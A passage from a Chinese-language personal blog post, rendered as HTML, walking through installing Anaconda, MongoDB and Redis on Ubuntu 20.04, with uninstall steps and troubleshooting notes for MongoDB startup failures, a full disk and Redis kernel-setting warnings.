<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nx">installation</span> <span class="nx">finished</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="nx">Do</span> <span class="nx">you</span> <span class="nx">wish</span> <span class="nx">the</span> <span class="nx">installer</span> <span class="nx">to</span> <span class="nx">prepend</span> <span class="nx">the</span> <span class="nx">Anaconda3</span> <span class="nx">install</span> <span class="nx">location</span>
</span></span><span class="line"><span class="cl"><span class="nx">to</span> <span class="nx">PATH</span> <span class="k">in</span> <span class="nx">your</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">sammy</span><span class="o">/</span><span class="p">.</span><span class="nx">bashrc</span> <span class="o">?</span> <span class="p">[</span><span class="nx">yes</span><span class="o">|</span><span class="nx">no</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">no</span><span class="p">]</span> <span class="o">&gt;&gt;&gt;</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>建议输入<code>yes</code>以使用该<code>conda</code>命令。</p>
<p>接下来，系统将提示下载Visual Studio Code，可以从<a href="https://code.visualstudio.com/">官方VSCode网站</a>了解更多信息。</p>
<p>输入<code>yes</code>要安装和<code>no</code>拒绝安装。</p>
<p><strong>第七步 - 激活安装</strong></p>
<p>现在可以使用以下命令激活安装：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">source</span> <span class="o">~</span><span class="err">/.bashrc</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>第八步 - 测试安装</strong></p>
<p>使用此<code>conda</code>命令测试安装和激活：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">conda</span> <span class="nx">list</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将收到通过Anaconda安装可用的所有软件包的输出。</p>
<p><strong>第九步 - 设置Anaconda环境</strong></p>
<p>可以使用该<code>conda create</code>命令创建Anaconda环境。例如，可以使用以下命令创建名为<code>my_env</code>的Python 3环境：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">conda</span> <span class="nx">create</span> <span class="o">--</span><span class="nx">name</span> <span class="nx">my_env</span> <span class="nx">python</span><span class="o">=</span><span class="mi">3</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>像这样激活新环境：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">source</span> <span class="nx">activate</span> <span class="nx">my_env</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>您的命令提示符前缀将更改以反映您处于活动的Anaconda环境中，现在您已准备好开始处理项目。</p>
<p><strong>常用命令</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#创建虚拟环境</span>
</span></span><span class="line"><span class="cl">conda create -n your_env_name <span class="nv">python</span><span class="o">=</span>X.X（3.6、3.7等）
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#激活虚拟环境</span>
</span></span><span class="line"><span class="cl"><span class="nb">source</span> activate your_env_name<span class="o">(</span>虚拟环境名称<span class="o">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#退出虚拟环境</span>
</span></span><span class="line"><span class="cl"><span class="nb">source</span> deactivate your_env_name<span class="o">(</span>虚拟环境名称<span class="o">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#删除虚拟环境</span>
</span></span><span class="line"><span class="cl">conda remove -n your_env_name<span class="o">(</span>虚拟环境名称<span class="o">)</span> --all
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#查看安装了哪些包</span>
</span></span><span class="line"><span class="cl">conda list
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#安装包</span>
</span></span><span class="line"><span class="cl">conda install package_name<span class="o">(</span>包名<span class="o">)</span>
</span></span><span class="line"><span class="cl">conda install <span class="nv">scrapy</span><span class="o">==</span>1.3 <span class="c1"># 安装指定版本的包</span>
</span></span><span class="line"><span class="cl">conda install -n 环境名 包名 <span class="c1"># 在conda指定的某个环境中安装包</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#查看当前存在哪些虚拟环境</span>
</span></span><span class="line"><span class="cl">conda env list 
</span></span><span class="line"><span class="cl"><span class="c1">#或 </span>
</span></span><span class="line"><span class="cl">conda info -e
</span></span><span class="line"><span class="cl"><span class="c1">#或</span>
</span></span><span class="line"><span class="cl">conda info --envs
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#检查更新当前conda</span>
</span></span><span class="line"><span class="cl">conda update conda
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#更新anaconda</span>
</span></span><span class="line"><span class="cl">conda update anaconda
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#更新所有库</span>
</span></span><span class="line"><span class="cl">conda update --all
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#更新python</span>
</span></span><span class="line"><span class="cl">conda update python
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装mongodb">安装mongodb<a hidden class="anchor" aria-hidden="true" href="#安装mongodb">#</a></h3>
<h4 id="apt安装">apt安装<a hidden class="anchor" aria-hidden="true" href="#apt安装">#</a></h4>
<p><a href="https://blog.csdn.net/yutu75/article/details/110941936">https://blog.csdn.net/yutu75/article/details/110941936</a></p>
<p><strong>基本安装</strong></p>
<p>目前最新版本为4.4版本，ubuntu20.04中默认安装的是3.6版本【可以继续基于这个版本进行学习，这块内容跳过即可】。</p>
<p>安装之前建议更新下Linux源.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 1、备份源文件</span>
</span></span><span class="line"><span class="cl">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak  
</span></span><span class="line"><span class="cl"><span class="c1"># 2、添加源到sources.list中</span>
</span></span><span class="line"><span class="cl">sudo gedit /etc/apt/sources.list
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 在打开的文本中，添加阿里源</span>
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 3、更新源</span>
</span></span><span class="line"><span class="cl">sudo apt-get update
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果要在ubuntu20.04中安装最新4.4版本mongodb，则需要完成以下命令步骤：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 安装依赖包</span>
</span></span><span class="line"><span class="cl">sudo apt-get install libcurl4 openssl
</span></span><span class="line"><span class="cl"><span class="c1"># 关闭和卸载原有的mongodb</span>
</span></span><span class="line"><span class="cl">service mongodb stop
</span></span><span class="line"><span class="cl">sudo apt-get remove mongodb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 导入包管理系统使用的公钥</span>
</span></span><span class="line"><span class="cl">wget -qO - https://www.mongodb.org/static/pgp/server-4.4.asc <span class="p">|</span> sudo apt-key add -
</span></span><span class="line"><span class="cl"><span class="c1"># 如果命令执行结果没有显示OK，则执行此命令在把上一句重新执行：sudo apt-get install gnupg</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 注册mongodb源</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.4 multiverse&#34;</span> <span class="p">|</span> sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 更新源</span>
</span></span><span class="line"><span class="cl">sudo apt-get update
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 安装mongodb</span>
</span></span><span class="line"><span class="cl">sudo apt-get install -y mongodb-org<span class="o">=</span>4.4.2 mongodb-org-server<span class="o">=</span>4.4.2 mongodb-org-shell<span class="o">=</span>4.4.2 mongodb-org-mongos<span class="o">=</span>4.4.2 mongodb-org-tools<span class="o">=</span>4.4.2
</span></span><span class="line"><span class="cl"><span class="c1"># 安装过程中如果提示: mongodb-org-tools : 依赖: mongodb-database-tools 但是它将不会被安装</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 终端下运行以下命令,解决:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># sudo apt-get autoremove mongodb-org-mongos mongodb-org-tools mongodb-org</span>
</span></span><span class="line"><span class="cl"><span class="c1"># sudo apt-get install -y mongodb-org=4.4.2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 创建数据存储目录</span>
</span></span><span class="line"><span class="cl">sudo mkdir -p /data/db
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 修改配置，开放27017端口</span>
</span></span><span class="line"><span class="cl">sudo vim /etc/mongod.conf
</span></span><span class="line"><span class="cl"><span class="c1"># 把12行附近的port=27017左边的#号去掉</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>启动和关闭MongoDB</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 重新加载配置，并启动mongodb</span>
</span></span><span class="line"><span class="cl">sudo systemctl daemon-reload
</span></span><span class="line"><span class="cl">sudo systemctl start mongod
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 查看运行状态</span>
</span></span><span class="line"><span class="cl">sudo systemctl status mongod
</span></span><span class="line"><span class="cl"><span class="c1"># 如果mongodb状态为stop，则运行 sudo systemctl enable mongod</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 停止mongodb</span>
</span></span><span class="line"><span class="cl">sudo systemctl stop mongod
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 重启mongodb</span>
</span></span><span class="line"><span class="cl">sudo systemctl restart mongod
</span></span></code></pre></td></tr></table>
</div>
</div><p><a href="https://blog.csdn.net/WU2629409421perfect/article/details/110572874">Ubuntu安装mongo并设置账户密码</a></p>
<p>==问题：==</p>
<p>mongodb启动之后立马关闭</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341456.png" alt="image-20220729225549702"  />
</p>
<p>1.修改<code>/tmp</code>目录下<code>mongodb-23266.sock</code>的权限</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">cd</span> /tmp
</span></span><span class="line"><span class="cl">ls -l *.sock
</span></span><span class="line"><span class="cl">chown root:root mongodb-23266.sock
</span></span><span class="line"><span class="cl">systemctl start mongod
</span></span><span class="line"><span class="cl">systemctl status mongod
</span></span></code></pre></td></tr></table>
</div>
</div><p>修改之后启动mongodb，出现另外一个错误</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341471.png" alt="image-20220729231956810"  />
</p>
<p>打开日志查看错误：</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341487.png" alt="image-20220730094939388"  />
</p>
<p>==建议重装==</p>
<h4 id="压缩包安装">压缩包安装<a hidden class="anchor" aria-hidden="true" href="#压缩包安装">#</a></h4>
<h3 id="mongodb彻底卸载方式">mongodb彻底卸载方式<a hidden class="anchor" aria-hidden="true" href="#mongodb彻底卸载方式">#</a></h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">1.停止 mongodb服务
</span></span><span class="line"><span class="cl">sudo service mongod stop
</span></span><span class="line"><span class="cl">2.卸载mongodb
</span></span><span class="line"><span class="cl">sudo apt-get remove mongodb
</span></span><span class="line"><span class="cl">3.移除相关包
</span></span><span class="line"><span class="cl">sudo apt-get purge mongodb-org*
</span></span><span class="line"><span class="cl">sudo apt-get purge mongodb
</span></span><span class="line"><span class="cl">sudo apt-get autoremove
</span></span><span class="line"><span class="cl">sudo apt-get autorclean
</span></span><span class="line"><span class="cl">4.移除相关目录
</span></span><span class="line"><span class="cl">sudo rm -r /var/log/mongodb
</span></span><span class="line"><span class="cl">sudo rm -r /var/lib/mongodb
</span></span><span class="line"><span class="cl">5.查看系统还有哪些残留的文件或目录
</span></span><span class="line"><span class="cl">whereis mongo
</span></span><span class="line"><span class="cl">whereis mongodb
</span></span><span class="line"><span class="cl">whereis mongod
</span></span><span class="line"><span class="cl">which mongo
</span></span><span class="line"><span class="cl">which mongodb
</span></span><span class="line"><span class="cl">which mongod
</span></span><span class="line"><span class="cl">6.删除/data/db（我自己加的）
</span></span><span class="line"><span class="cl">rm -rf /data/db
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装redis">安装redis<a hidden class="anchor" aria-hidden="true" href="#安装redis">#</a></h3>
<p>==重要的事情说三遍！：服务器上不要开放对外端口，必要时修改端口，设置密码，不然会被注入cleanfda木马==</p>
<p><a href="https://developer.aliyun.com/article/764565">https://developer.aliyun.com/article/764565</a></p>
<p><strong>一、在 Ubuntu 20.04 上安装 Redis</strong></p>
<p>在 Ubuntu 上安装 Redis 非常简单直接。</p>
<p>Redis 5.0 被包含在默认的 Ubuntu 20.04 软件源中。想要安装它，以 root 或者其他 sudo 身份运行下面的命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt update
</span></span><span class="line"><span class="cl">sudo apt install redis-server
</span></span></code></pre></td></tr></table>
</div>
</div><p>一旦安装完成，Redis 服务将会自动启动。想要检查服务的状态，输入下面的命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo systemctl status redis-server
</span></span></code></pre></td></tr></table>
</div>
</div><p>你应该看到下面这些：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">● redis-server.service - Advanced key-value store
</span></span><span class="line"><span class="cl">     Loaded: loaded (/lib/systemd/system/redis-server.service; enabled; vendor preset: enabled)
</span></span><span class="line"><span class="cl">     Active: active (running) since Sat 2020-06-06 20:03:08 UTC; 10s ago
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">如果你的服务器上禁用 IPv6，那么 Redis 服务将会启动失败。
</span></span></code></pre></td></tr></table>
</div>
</div><p>就这些。你已经在你的 Ubuntu 20.04 上安装并运行了 Redis。</p>
<p><strong>二、配置 Redis 远程访问</strong></p>
<p>默认情况下，Redis 不允许远程连接。你仅仅只能从127.0.0.1（localhost）连接 Redis 服务器 - Redis 服务器正在运行的机器上。</p>
<p>如果你正在使用单机，数据库也同样在这台机器上，你不需要启用远程访问。</p>
<p>想要配置 Redis 来接受远程访问，使用你的文本编辑器打开 Redis 配置文件 （<a href="https://www.yisu.com/ask/5627.html">查看redis配置文件位置</a>）：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo nano /etc/redis.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>定位到以<code>bind 127.0.0.1 ::1</code>开头的一行，并且取消它的注释：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># bind 0.0.0.0 ::1
</span></span><span class="line"><span class="cl">如果你的服务器有局域网 IP，并且你想要 Redis 从局域网可以访问 Redis，在这一行后面加上服务器局域网 IP 地址。
</span></span></code></pre></td></tr></table>
</div>
</div><p>保存这个文件，并且重启 Redis 服务，使应用生效：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo systemctl restart redis-server
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用下面的命令来验证 Redis 服务器正在监听端口<code>6379</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ss -an | grep 6379
</span></span></code></pre></td></tr></table>
</div>
</div><p>你应该能看到类似下面的信息：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tcp  LISTEN 0   511   0.0.0.0:6379   0.0.0.0:*
</span></span><span class="line"><span class="cl">tcp  LISTEN 0   511      [::]:6379      [::]:*  
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>同时还要进行如下配置，防止redis运行几天后报错</strong></p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341504.png" alt="img"  />
</p>
<p><a href="https://blog.csdn.net/weixin_41866960/article/details/89608666">Redis踩坑——MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on</a></p>
<p>1.直接修改redis.conf配置文件，但是更改后需要重启redis。</p>
<p>修改redis.conf文件：</p>
<p>（1）vim打开redis-server配置的redis.conf文件  <code>/etc/redis/redis.conf</code>，</p>
<p>（2）使用快捷匹配模式：</p>
<p><code>/stop-writes-on-bgsave-error</code>定位到stop-writes-on-bgsave-error字符串所在位置，</p>
<p>（3）把后面的yes设置为no。</p>
<p>2.在<code>/etc/sysctl.conf</code> 添加一项 <code>vm.overcommit_memory = 1</code> ，然后重启（或者运行命令<code>sysctl vm.overcommit_memory=1</code> ）使其生效）</p>
<p>使用如下命令刷新配置，使其立即生效：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sysctl -p 
</span></span><span class="line"><span class="cl">sysctl -w net.ipv4.route.flush<span class="o">=</span><span class="m">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>重启redis失效</strong></p>
<p>杀死redis进程重新restart</p>
<p><code>ps -ef | grep redis</code></p>
<p><code>kill -s 9 进程id</code></p>
<p><code>systemctl restart redis.service</code></p>
<p><strong>还是启动不起来，打开日志查看问题</strong></p>
<p><code>cat /var/log/redis/redis-server.log</code></p>
<blockquote>
<p>Write error saving DB on disk: No space left on device</p>
</blockquote>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341699.png" alt="image-20220801100922179"  />
</p>
<p>查看磁盘的占用情况</p>
<p><code>df -h</code></p>
<p>还真满了</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341714.png" alt="image-20220801101229217"  />
</p>
<p><strong>寻找原因：</strong></p>
<p>从根目录下开始使用<code>du</code>命令查找出空间占用最大的文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">#查看当前目录下每个文件夹所占用的空间</span>
</span></span><span class="line"><span class="cl">du -sh *
</span></span></code></pre></td></tr></table>
</div>
</div><p>删除掉大文件之后还是不行，再次执行<code>df -h</code>查看磁盘使用状况，可以看到<code>/snap</code>下的文件使用情况都是100%</p>
<img src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341727.png" alt="image-20220801102649566" style="zoom:67%;" /> 
<p>可以看到<code>/opt</code>文件夹占用了极大的空间，再一层层排查发现是tomcat生成的日志文件过大</p>
<p><strong>删除掉tomcat的日志即可</strong></p>
<p><a href="https://blog.csdn.net/ZCY5202015/article/details/120685589">https://blog.csdn.net/ZCY5202015/article/details/120685589</a></p>
<p><strong>杀死redis进程失效</strong></p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341744.png" alt="image-20220801104721500"  />
</p>
<p>执行<code>sysctl vm.overcommit_memory=1</code>便可重启redis： <code>systemctl restart redis.service</code></p>
<p><strong>redis启动报WARNING</strong></p>
<blockquote>
<p>8423:M 01 Aug 10:47:50.770 # WARNING you have Transparent Huge Pages (THP) support enabled in your ernel. This will create latency and memory usage issues with Redis. To fix this issue run the commad &rsquo;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&rsquo; as root, and add it to your /etc/rc.loal in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.</p>
</blockquote>
<p>root用户执行<code>echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</code></p>
<p>编辑<code>/etc/rc.local</code>在最后一行添加<code>echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</code></p>
<p>重启redis： <code>systemctl restart redis.service</code></p>
<blockquote>
<p>8528:M 01 Aug 11:00:34.857 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.</p>
</blockquote>
<p>解决方法</p>
<p>方式一：设置的值128较低，需要“echo 511 &gt; /proc/sys/net/core/somaxconn”命令，注意此命令只是暂时生效，如果重启后就会失效。</p>
<p>方式二：永久解决Redis中The TCP backlog setting of 511 cannot be enforced告警问题，编辑<code>/etc/sysctl.conf</code>文件，添加<code>net.core.somaxconn = 1024</code>然后执行<code>sysctl -p</code>命令查看是否添加成功，之后重启Redis服务即可。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
